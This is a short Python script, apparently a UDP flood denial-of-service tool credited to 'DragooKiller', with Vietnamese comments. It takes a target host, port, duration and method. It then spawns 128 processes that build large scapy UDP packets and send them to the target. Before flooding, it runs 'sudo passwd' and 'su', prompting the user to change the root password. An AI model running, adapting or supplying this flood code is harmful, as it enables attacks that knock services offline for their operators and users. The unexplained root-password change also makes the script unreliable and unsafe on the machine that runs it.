

import time
import sys
from scapy.sendrecv import send
from scapy.layers.inet import IP, UDP
from multiprocessing import Process, Queue

host = str(sys.argv[1])
port = int(sys.argv[2])
duration = int(sys.argv[3])
method = str(sys.argv[4])
print("giờ set pass superuser đi cu")
import os
os.system("sudo passwd")
print("tiếp log superuser đi")
os.system("su")
print("udp layer 4 lỏ nhé, ok👌\nUdp by DragooKiller👉👈")
def send_packet(amplifier, duration, queue):
    end_time = time.time() + duration
    while time.time() < end_time:
        packet = IP(dst=host)/UDP(dport=port)/("X"*amplifier)
        queue.put(packet)  # Lưu trữ tin vào queue thay vì gửi trực tiếp
        time.sleep(0.001)

def send_packets_from_queue(queue):
    while not queue.empty():
        packet = queue.get()
        send(packet, verbose=0)

def attack_HQ():
    processes = []
    loops = 128  # Số lượng gói tin được gửi trong mỗi vòng lặp
    num_processes = 128  # Số lượng tiến trình đồng thời
    queue = Queue()  # Khởi tạo queue 
    

    if method == "f":
        for _ in range(num_processes):
            p = Process(target=send_packet, args=(2333, duration, queue))
            processes.append(p)
            p.start()
    if method == "er":
        for _ in range(num_processes):
            p = Process(target=send_packet, args=(6333, duration, queue))
            processes.append(p)
            p.start()
    if method == "ix":
        for _ in range(num_processes):
            p1 = Process(target=send_packet, args=(1933, duration, queue))
            p2 = Process(target=send_packet, args=(5634, duration, queue))
            processes.append(p1)
            processes.append(p2)
            p1.start()
            p2.start()
    
    # Gửi các gói tin từ queue
    for _ in range(loops):
        send_packets_from_queue(queue)

    for p in processes:
        p.join()

if __name__ == '__main__':
    attack_HQ() 
